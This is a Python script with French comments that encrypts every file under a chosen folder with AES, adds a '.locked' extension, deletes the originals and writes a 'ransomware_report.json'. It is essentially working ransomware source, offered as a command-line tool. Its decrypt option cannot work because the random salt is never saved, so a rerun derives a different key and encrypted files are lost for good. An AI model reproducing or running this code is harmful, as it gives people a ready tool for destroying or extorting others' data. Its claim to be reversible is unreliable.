import os
import json
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Générer une clé AES (256 bits) à partir d'un mot de passe

def generate_key(password: str, salt: bytes = None):
    if salt is None:
        salt = os.urandom(16)
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key, salt

# Chiffrement réel d'un fichier

def encrypt_file(file_path, key):
    try:
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        with open(file_path, "rb") as f:
            plaintext = f.read()

        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plaintext) + padder.finalize()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        with open(file_path + ".locked", "wb") as f:
            f.write(iv + ciphertext)

        os.remove(file_path)  # Supprimer le fichier original après chiffrement

        return {"file_path": file_path, "status": "encrypted"}
    except Exception as e:
        return {"file_path": file_path, "error": str(e)}

# Déchiffrement réel d'un fichier

def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
            iv, ciphertext = data[:16], data[16:]

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()

        with open(file_path.replace(".locked", ""), "wb") as f:
            f.write(decrypted_data)

        os.remove(file_path)  # Supprimer le fichier chiffré après déchiffrement

        return {"file_path": file_path, "status": "decrypted"}
    except Exception as e:
        return {"file_path": file_path, "error": str(e)}

# Chiffrement de tous les fichiers dans un dossier cible

def encrypt_directory(directory, key):
    if not os.path.exists(directory):
        print("Erreur : Le répertoire spécifié n'existe pas.")
        return []
    
    report = []
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            file_report = encrypt_file(file_path, key)
            report.append(file_report)
    return report

# Déchiffrement de tous les fichiers dans un dossier cible

def decrypt_directory(directory, key):
    report = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".locked"):
                file_path = os.path.join(root, file)
                file_report = decrypt_file(file_path, key)
                report.append(file_report)
    return report

# Interface CLI
if __name__ == "__main__":
    action = input("Choisissez une action (encrypt/decrypt) : ").strip().lower()
    target_directory = input("Entrez le chemin du dossier cible : ").strip()
    password = input("Entrez un mot de passe sécurisé : ").strip()

    key, salt = generate_key(password)
    
    if action == "encrypt":
        report = encrypt_directory(target_directory, key)
    elif action == "decrypt":
        report = decrypt_directory(target_directory, key)
    else:
        print("Action invalide. Utilisez 'encrypt' ou 'decrypt'.")
        exit()
    
    save_path = "ransomware_report.json"
    with open(save_path, "w") as f:
        json.dump(report, f, indent=4)
    print(f"Rapport sauvegardé sous {save_path}")
